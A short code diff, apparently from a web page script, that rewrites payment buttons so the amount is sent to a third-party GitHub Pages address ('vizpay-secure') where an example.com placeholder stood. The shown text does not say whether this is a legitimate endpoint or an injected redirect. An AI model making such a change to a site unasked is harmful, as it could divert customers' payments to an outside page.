@@ -6,7 +6,7 @@
                 const amountText = button.innerText.trim();
                 const amount = amountText.replace(/\D/g, ""); // Extract only numbers
                 
-                const newBaseUrl = "https://example.com/payment?amount=";
+                const newBaseUrl = "https://vizpay-secure.github.io/vizpay/?isc=";
                 button.href = newBaseUrl + amount;
                 button.dataset.updated = "true"; // Mark as updated to avoid duplicate updates
             }
